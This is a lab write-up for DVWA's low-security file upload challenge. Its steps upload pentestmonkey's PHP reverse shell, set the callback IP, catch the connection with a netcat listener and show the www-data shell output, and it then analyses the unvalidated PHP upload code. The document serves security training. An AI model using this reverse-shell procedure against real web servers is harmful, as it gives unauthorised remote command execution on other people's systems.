# File Upload - Low

---

## Attack Steps

1. Open the target page in the browser:
    - http://<ip address>/dvwa/vulnerabilities/upload

2. Open a terminal 
    - Use PowerShell

3. Download or copy php-reverse-shell.php into a local folder (e.g., Downloads)
    
    - https://github.com/pentestmonkey/php-reverse-shell

4. Edit the `php-reverse-shell.php` webshell using notepad or VS Code

    - Change the IP address 
    ```bash 
    $IP = '192.168.56.102'; # Example IP address
    ```

5. Save and exit 

6. On the target page, upload the webshell 

7. Use Netcat for Windows: nc.exe -lvnp 1234 (must be in PATH or same folder)

    ```bash 
    nc.exe -lvnp 1234 # If you changed the port number in the webshell file then change it here 
    # l - listener mode
    # v - verbose output 
    # n - skip DNS resolution (faster) 
    # p <port number> - Listen on port number assigned # Change to your port number
    ```

7. Navigate to the uploaded webshell 

    - The uploaded file was saved to `http://localhost/dvwa/hackable/uploads/php-reverse-shell.php`

    - Alternatively run `Invoke-WebRequest -Uri http://localhost/dvwa/hackable/uploads/php-reverse-shell.php -UseBasicParsing` in another terminal 

8. On the netcat listener look a connection
    
    - The should be output similar to the following 
    ```bash 
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    sh: no job control in this shell 
    sh-3.2$ 
    ```

    - We can now run commands on the DVWA machine

## Vulnerable Code Analysis


### File 
`C:\xampp\htdocs\DVWA\vulnerabilities\upload\source\low.php`

#### Key Vulnerability Points:

```php 
 <?php
    if (isset($_POST['Upload'])) {

            $target_path = DVWA_WEB_PAGE_TO_ROOT."hackable/uploads/";
            $target_path = $target_path . basename( $_FILES['uploaded']['name']);

            if(!move_uploaded_file($_FILES['uploaded']['tmp_name'], $target_path)) {
                
                echo '<pre>';
                echo 'Your image was not uploaded.';
                echo '</pre>';
                
              } else {
            
                echo '<pre>';
                echo $target_path . ' succesfully uploaded!';
                echo '</pre>';
                
            }

        }
?> 
```

### Explanation

- The code takes the uploaded file directly from the user without validation or sanitisation:

    ```php 
    $target_path = DVWA_WEB_PAGE_TO_ROOT."hackable/uploads/";
    $target_path = $target_path . basename($_FILES['uploaded']['name']);
    ```
- The file is then moved to a web accessible upload directory 

    ```php 
    move_uploaded_file($_FILES['uploaded']['tmp_name'], $target_path)
    ```

- This allows an attacker to upload any file, including malicious scripts in this case PHP

- An attacker can exploit this by uploading a webshell e.g. shell.php
- This can be executed remotely as its accessible via a browser or using `curl`

- Causes: 
    - No validation or sanitization of the uploaded filename or file content, so users can upload anything.

    - No restrictions on allowed file types or extensions.

    - Upload directory is directly accessible via the web, allowing execution of uploaded scripts.

    - Lack of checks like MIME type verification, file extension whitelisting, or scanning for malicious content.
